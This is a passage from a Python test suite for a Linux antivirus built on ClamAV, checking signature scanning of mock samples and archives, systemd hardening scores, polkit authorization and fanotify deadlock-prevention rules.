            threat_intel=self.scanner.intel,
            vault=self.vault,
            auto_start_daemon=False
        )

        self.assertTrue(mgr.is_engine_available())
        ver = mgr.get_engine_version()
        self.assertIn("ClamAV 1.0.5", ver)

        status_info = mgr.get_status_info()
        self.assertTrue(status_info["clamd_available"])
        self.assertTrue(status_info["archive_protection_active"])

        # 2. Análisis de malware conocido
        threat_file = os.path.join(self.tmp, "threat_sample.bin")
        with open(threat_file, "w") as f:
            f.write("dummy threat")
        is_inf, name, details = mgr.scan_file(threat_file)
        self.assertTrue(is_inf)
        self.assertEqual(name, "ClamAV.Win.Trojan.Agent-999")

        # 3. Análisis de archivo comprimido infectado
        zip_path = os.path.join(self.tmp, "container_with_threat.zip")
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("clean_doc.txt", "texto limpio")
            zf.writestr("threat.bin", "contenido hostil detectado por mock clamd")

        is_zip_inf, zip_threat, zip_details = mgr.scan_file(zip_path)
        self.assertTrue(is_zip_inf)
        self.assertIn("Win.Trojan.Agent-999", zip_threat)

        # 4. Coordinación On-Access con fanotify y prevención de loops
        mock_interceptor = MagicMock()
        mock_interceptor.whitelist = MagicMock()
        coord_res = mgr.coordinate_on_access_protection(mock_interceptor)
        self.assertEqual(coord_res["on_access_mode"], "FANOTIFY_SYNCHRONOUS_COOPERATIVE")

        # 5. Ejecución de actualización de firmas (tolerante a ausencia de red o freshclam)
        update_res = mgr.update_signatures(timeout=2)
        self.assertIn("message", update_res)

        server_sock.close()


    def test_systemd_security_auditor_compliance(self):
        """Verifica la evaluación del SystemdSecurityAuditor y el cumplimiento de las recomendaciones oficiales."""
        from core.engine.systemd_hardening import SystemdSecurityAuditor
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        auditor = SystemdSecurityAuditor(unit_path=service_file)
        posture = auditor.evaluate_security_posture()
        self.assertTrue(posture["unit_found"])
        self.assertGreaterEqual(posture["score"], 90)
        self.assertEqual(posture["rating"], "HARDENED_EXCELLENT")
        self.assertIn("NoNewPrivileges", posture["passed_checks"])
        self.assertIn("ProtectSystem", posture["passed_checks"])
        self.assertIn("ProtectHome", posture["passed_checks"])
        self.assertIn("PrivateTmp", posture["passed_checks"])
        self.assertIn("CapabilityBoundingSet", posture["passed_checks"])
        self.assertIn("DevicePolicy", posture["passed_checks"])
        self.assertIn("SystemCallFilter", posture["passed_checks"])
        self.assertIn("SystemCallArchitectures", posture["passed_checks"])


    def test_polkit_authorization_integration_and_elevation(self):
        """Verifica la delegación de autorización en Polkit y la ejecución segura de constantine-helper."""
        from core.auth.auth_manager import AuthManager
        import subprocess

        auth = AuthManager()
        self.assertTrue(auth.is_polkit_available(), "pkcheck debe estar disponible en el sistema")

        # Mock de subprocess.run para validar autorización exitosa sin diálogo de escritorio en entorno headless
        with unittest.mock.patch("subprocess.run") as mock_run:
            mock_run.return_value = unittest.mock.MagicMock(returncode=0, stdout=b"", stderr=b"")
            ok, tok = auth.request_polkit_authorization("org.constantine.antivirus.admin.unlock")
            self.assertTrue(ok)
            self.assertIsNotNone(tok)
            self.assertTrue(auth.is_session_valid(tok))

            mock_run.assert_called_once()
            called_cmd = mock_run.call_args[0][0]
            self.assertEqual(called_cmd[0], "pkcheck")
            self.assertIn("--action-id=org.constantine.antivirus.admin.unlock", called_cmd)
            self.assertIn("--allow-user-interaction", called_cmd)

        # Mock de fallo/cancelación por parte del usuario
        with unittest.mock.patch("subprocess.run") as mock_run_fail:
            mock_run_fail.return_value = unittest.mock.MagicMock(returncode=1, stdout=b"", stderr=b"Not authorized")
            ok_fail, tok_fail = auth.request_polkit_authorization("org.constantine.antivirus.admin.unlock")
            self.assertFalse(ok_fail)
            self.assertIsNone(tok_fail)

        # Validación de argumentos estrictos de constantine-helper
        helper_path = os.path.join(ROOT_DIR, "service", "constantine-helper")
        res_help = subprocess.run([sys.executable, helper_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.assertNotEqual(res_help.returncode, 0, "Invocar sin argumentos debe fallar")
        self.assertIn(b"Comando requerido", res_help.stderr)

        res_invalid_action = subprocess.run([sys.executable, helper_path, "evil-action"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.assertNotEqual(res_invalid_action.returncode, 0)
        self.assertIn(b"no reconocida", res_invalid_action.stderr)

    def test_fanotify_anti_deadlock_and_infrastructure_bypass(self):
        """
        Verifica la prevención crítica de bloqueos mutuos (Deadlock Prevention):
        1. Comprueba que PIDs ignorados (PID propio, init PID 1, kernel PID 2) reciban FAN_ALLOW inmediato.
        2. Comprueba que rutas de infraestructura propia (/opt/constantine) y ClamAV (/var/lib/clamav) reciban FAN_ALLOW.
        3. Comprueba que procesos reconocidos (clamd, freshclam) sean añadidos a ignored_pids y reciban FAN_ALLOW.
        4. Comprueba que add_ignored_pid y add_ignored_comm funcionen correctamente.
        """
        mock_scanner = MagicMock()
        interceptor = FanotifyInterceptor(scanner=mock_scanner, vault=self.vault)

        # 1. Registro de PIDs y Comms
        interceptor.add_ignored_pid(99991)
        self.assertIn(99991, interceptor.ignored_pids)
        interceptor.add_ignored_comm("clamd")
        self.assertIn("clamd", interceptor.ignored_comm_names)

        # 2. Evaluación de PID en ignored_pids
        from core.engine.interceptor import AuthorizationContext, FAN_ALLOW, FAN_DENY, FAN_OPEN_PERM
        ctx_ignored_pid = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=99991, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
        interceptor._evaluate_event(ctx_ignored_pid)
        self.assertTrue(ctx_ignored_pid.responded)
        self.assertEqual(ctx_ignored_pid.decision, FAN_ALLOW)
        self.assertEqual(ctx_ignored_pid.reason, "SELF_OR_SYSTEM_PID")

        # 3. Evaluación de PID init (1) y kernel (2)
        ctx_init = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
        interceptor._evaluate_event(ctx_init)
        self.assertEqual(ctx_init.decision, FAN_ALLOW)
        self.assertEqual(ctx_init.reason, "SELF_OR_SYSTEM_PID")

        # 4. Evaluación de ruta de infraestructura Constantine
        ctx_infra = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=8888, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
        with unittest.mock.patch("os.readlink", return_value="/opt/constantine/daemon.py"):
            interceptor._evaluate_event(ctx_infra)
            self.assertEqual(ctx_infra.decision, FAN_ALLOW)
            self.assertEqual(ctx_infra.reason, "SELF_INFRASTRUCTURE")

        # 5. Evaluación de ruta de base de datos ClamAV
        ctx_clamav = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=8888, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
        with unittest.mock.patch("os.readlink", return_value="/var/lib/clamav/daily.cld"):
            interceptor._evaluate_event(ctx_clamav)
            self.assertEqual(ctx_clamav.decision, FAN_ALLOW)
            self.assertEqual(ctx_clamav.reason, "CLAMAV_INFRASTRUCTURE")

        # 6. Evaluación de proceso con comm ignorado (ej. clamd)
        ctx_comm = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=77112, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
        with unittest.mock.patch("os.readlink", return_value="/home/user/document.txt"),              unittest.mock.patch.object(interceptor, "get_process_name", return_value="clamd"):
            interceptor._evaluate_event(ctx_comm)
            self.assertEqual(ctx_comm.decision, FAN_ALLOW)
            self.assertEqual(ctx_comm.reason, "IGNORED_COMM")
            self.assertIn(77112, interceptor.ignored_pids)


if __name__ == "__main__":
    unittest.main()
